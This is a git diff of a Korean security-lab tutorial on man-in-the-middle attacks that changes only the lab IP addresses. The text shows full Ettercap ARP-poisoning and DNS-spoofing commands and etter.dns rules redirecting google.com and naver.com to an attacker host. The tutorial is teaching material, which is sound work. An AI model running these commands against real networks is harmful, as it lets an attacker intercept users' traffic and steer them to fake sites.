@@ -22,7 +22,7 @@ mermaid: true
 > 4. MITM의 방어 대책을 제시할 수 있다.
 {: .prompt-info }
 
-> **이번 실습 대상**: 피해자 Ubuntu `192.168.0.30`, 게이트웨이 `192.168.0.1`, 공격자 Kali `192.168.0.10`.
+> **이번 실습 대상**: 피해자 Ubuntu `192.168.60.30`, 게이트웨이 `192.168.60.1`, 공격자 Kali `192.168.60.10`.
 {: .prompt-info }
 
 지금까지는 특정 호스트의 취약점을 노렸습니다. 이제 표적을 바꿔 두 컴퓨터가 “주고받는 통신 그 자체”를 노립니다. 대화하는 두 사람 사이에 몰래 끼어들어 엿듣거나 말을 바꿔치기하는 공격 — 이것이 **중간자 공격(Man-in-the-Middle, MITM)**입니다.
@@ -68,14 +68,14 @@ flowchart LR
 앞의 두 재료를 합쳐 요리를 만듭니다. ARP 스푸핑으로 통신 사이의 “중간 자리”를 잡고([06장](/posts/networkset-06-arp-sniffing/)), DNS의 무인증이라는 약점을 찌릅니다([08장](/posts/networkset-08-dns-dhcp-snmp/)). 그 결과, 피해자가 특정 도메인을 조회할 때 가짜 IP를 돌려주어 위조 사이트로 유도하는 공격을 **Ettercap 하나**로 완성합니다. Ettercap은 ARP 스푸핑·비밀번호 추출·DNS 위조 등 MITM에 필요한 기능을 **플러그인** 방식으로 한자리에 모은 종합 도구입니다.
 
 > **실습 7-1. Ettercap으로 DNS 스푸핑하기**  
-> **목표** ARP 스푸핑과 DNS 스푸핑을 동시에 수행해, 피해자의 도메인 조회를 공격자 IP로 위조한다. **대상** Kali(192.168.0.10) / 피해자 Ubuntu(192.168.0.30) / 게이트웨이(192.168.0.1).
+> **목표** ARP 스푸핑과 DNS 스푸핑을 동시에 수행해, 피해자의 도메인 조회를 공격자 IP로 위조한다. **대상** Kali(192.168.60.10) / 피해자 Ubuntu(192.168.60.30) / 게이트웨이(192.168.60.1).
 {: .prompt-tip }
 
 **1단계 — 환경 준비와 타깃 확인** (Kali)
 
 ```bash
 sudo sysctl -w net.ipv4.ip_forward=1      # 경유 트래픽을 원래 목적지로 전달
-nmap -sn 192.168.0.0/24                    # 피해자·게이트웨이 확인
+nmap -sn 192.168.60.0/24                    # 피해자·게이트웨이 확인
 ```
 
 ![nmap -sn — 내부망 활성 호스트 확인](/assets/img/posts/2026-06-10-networkset-07-ettercap-01.png)
@@ -89,10 +89,10 @@ sudo nano /etc/ettercap/etter.dns
 ```
 
 ```text
-google.com    A   192.168.0.10
-*.google.com  A   192.168.0.10
-naver.com     A   192.168.0.10
-*.naver.com   A   192.168.0.10
+google.com    A   192.168.60.10
+*.google.com  A   192.168.60.10
+naver.com     A   192.168.60.10
+*.naver.com   A   192.168.60.10
 ```
 
 > **왜?** `etter.dns`는 “어떤 도메인을 어떤 IP로 위조할지”를 적어 두는 규칙표입니다. A 레코드(도메인→IPv4)를 공격자 IP로 지정하면, Ettercap은 피해자가 그 도메인을 물을 때 이 가짜 답을 대신 돌려줍니다. 규칙이 없으면 위조할 대상이 없어 아무 일도 일어나지 않습니다.
@@ -116,11 +116,11 @@ sudo systemctl start apache2      # 위조 IP로 접속했을 때 보여 줄 페
 **4단계 — Ettercap으로 ARP + DNS 스푸핑 실행**
 
 ```bash
-sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /192.168.0.1// /192.168.0.30//
+sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /192.168.60.1// /192.168.60.30//
 #  -T 텍스트모드,  -M arp:remote 양방향 ARP MITM,  -P dns_spoof DNS 위조 플러그인
 ```
 
-> **왜?** `-M arp:remote`가 먼저 게이트웨이와 피해자를 양쪽으로 속여 중간 자리를 잡고(6장의 두 arpspoof를 한 번에), `-P dns_spoof`가 그 자리에서 지나가는 DNS 질의를 가로채 `etter.dns` 규칙대로 위조 응답을 끼워 넣습니다. 두 타깃(`/192.168.0.1//`, `/192.168.0.30//`)은 “게이트웨이와 피해자 사이”를 가로채라는 지정입니다. GUI(`-G`)에서는 `Hosts scan → 타깃 지정 → MITM: ARP poisoning → Plugins: dns_spoof → Start` 순서로 진행합니다.
+> **왜?** `-M arp:remote`가 먼저 게이트웨이와 피해자를 양쪽으로 속여 중간 자리를 잡고(6장의 두 arpspoof를 한 번에), `-P dns_spoof`가 그 자리에서 지나가는 DNS 질의를 가로채 `etter.dns` 규칙대로 위조 응답을 끼워 넣습니다. 두 타깃(`/192.168.60.1//`, `/192.168.60.30//`)은 “게이트웨이와 피해자 사이”를 가로채라는 지정입니다. GUI(`-G`)에서는 `Hosts scan → 타깃 지정 → MITM: ARP poisoning → Plugins: dns_spoof → Start` 순서로 진행합니다.
 
 <div style="display:flex;gap:8px;flex-wrap:wrap">
 <img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-05.png" alt="Ettercap GUI 초기 설정" style="max-width:32%">
@@ -130,21 +130,21 @@ sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /192.168.0.1// /192.168.0.30
 
 <div style="display:flex;gap:8px;flex-wrap:wrap">
 <img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-08.png" alt="Plugins에서 dns_spoof 활성화" style="max-width:48%">
-<img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-09.png" alt="dns_spoof 로그 — 도메인이 192.168.0.10으로 위조됨" style="max-width:48%">
+<img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-09.png" alt="dns_spoof 로그 — 도메인이 192.168.60.10으로 위조됨" style="max-width:48%">
 </div>
 
 **5단계 — 피해자 시스템에서 위조 확인**
 
 ```bash
 # (피해자 Ubuntu에서)
-nslookup google.com          # 응답 IP가 192.168.0.10 으로 나오는지
+nslookup google.com          # 응답 IP가 192.168.60.10 으로 나오는지
 ```
 
-> **왜?** 피해자에서 조회한 IP가 공격자(192.168.0.10)로 나오면 위조가 성공한 것입니다. 동시에 Kali의 Ettercap 화면에는 `dns_spoof … sending spoofed reply` 로그가 찍힙니다 — 공격이 실제로 응답을 바꿔치기하고 있다는 증거입니다. 브라우저로 접속하면 가짜 사이트가 뜨고, HTTPS 사이트는 **인증서 경고**가 나타납니다. 이 경고가 곧 방어의 실마리입니다.
+> **왜?** 피해자에서 조회한 IP가 공격자(192.168.60.10)로 나오면 위조가 성공한 것입니다. 동시에 Kali의 Ettercap 화면에는 `dns_spoof … sending spoofed reply` 로그가 찍힙니다 — 공격이 실제로 응답을 바꿔치기하고 있다는 증거입니다. 브라우저로 접속하면 가짜 사이트가 뜨고, HTTPS 사이트는 **인증서 경고**가 나타납니다. 이 경고가 곧 방어의 실마리입니다.
 
 <div style="display:flex;gap:8px;flex-wrap:wrap">
-<img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-10.png" alt="피해자 nslookup → 192.168.0.10" style="max-width:32%">
-<img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-11.png" alt="피해자 dig → 192.168.0.10" style="max-width:32%">
+<img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-10.png" alt="피해자 nslookup → 192.168.60.10" style="max-width:32%">
+<img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-11.png" alt="피해자 dig → 192.168.60.10" style="max-width:32%">
 <img src="/assets/img/posts/2026-06-10-networkset-07-ettercap-12.png" alt="가짜 사이트와 연결 안전하지 않음 경고" style="max-width:32%">
 </div>
 
